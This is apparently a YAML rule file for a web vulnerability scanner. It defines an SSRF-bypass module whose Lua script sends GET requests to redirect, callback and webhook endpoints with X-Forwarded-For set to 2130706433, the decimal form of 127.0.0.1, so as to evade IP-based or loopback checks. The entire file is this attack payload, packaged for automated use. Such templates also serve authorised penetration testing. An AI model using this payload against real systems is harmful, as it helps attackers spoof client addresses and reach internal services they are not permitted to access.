# 8. decimal_ip.yaml
meta:
  id: decimal_ip
  version: 2
  name: "Decimal IP Representation"
  description: "Uses decimal representation of IPv4 (2130706433)"
  author: "SSRFdevil"
  created: "2026-06-19"
  updated: "2026-07-21"
  rank: 80
  confidence: 90
  severity: high
  tags: [decimal, ipv4, encoding, bypass]
  references: []

match:
  schemes: [http, https]
  kinds: [Endpoint]
  allowed_methods: [GET, POST]
  required_tags: [Redirect, Callback, Webhook]
  require_params: true

script:
  language: lua
  entry: bypass
  source: |
    function bypass(ctx)
        local payload_vector = "2130706433" 
        local path = ctx.path or "/"
        if path:sub(1,1) ~= "/" then path = "/" .. path end
        local final_url = (ctx.scheme or "http") .. "://" .. ctx.hostname .. (ctx.port and ctx.port ~= "" and ":" .. tostring(ctx.port) or "") .. path
        
        local custom_headers = {}
        custom_headers["X-Forwarded-For"] = payload_vector
        custom_headers["Referer"] = ctx.target

        return {
            url = final_url,
            method = "GET",
            headers = custom_headers,
            body = "",
            action = "scan"
        }
    end